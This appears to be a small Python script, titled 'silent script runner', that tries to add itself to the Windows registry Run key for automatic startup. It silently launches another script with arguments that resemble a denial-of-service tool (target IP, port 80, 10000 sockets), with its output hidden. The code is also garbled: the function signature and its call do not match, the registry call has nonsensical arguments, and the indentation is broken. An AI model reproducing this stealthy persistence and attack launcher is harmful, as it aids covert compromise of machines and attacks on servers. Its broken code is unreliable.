#silent script runner

#Start of Imports
from argparse import Namespace
import pathlib
import winreg 
import os 
import subprocess
#End of Imports
#vars 
name_start = "Silence"
port = 80
ip = ("0.0.0.0")
socket_num=10000
#Code:

#Silent script runner
def  add_to_startup():
 name = name_start
 path= None
key= winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                    "Software\Microsoft\Windows\CurrentVersion\Run",
                    0,
                    winreg.KEY_WRITE)
winreg.SetValueEx(key,
                                                       
                Namespace,str, winreg.REG_SZ, pathlib) 
winreg.CloseKey(key)
if __name__ == "__main__":
 
 # Defines the name and location to run the script 
 cmd = "script.py (ip here) -p 80 -ua -s 10000"
 with open ('nul','w') as f:
  subprocess.call(cmd,stdout=f, stderr=f)

  #Adds the current Python script to the Windows registry to run automatically on startup 
  name = name_start
path = os.path.join(os.getcwd(),"script.py" )
add_to_startup(name, path)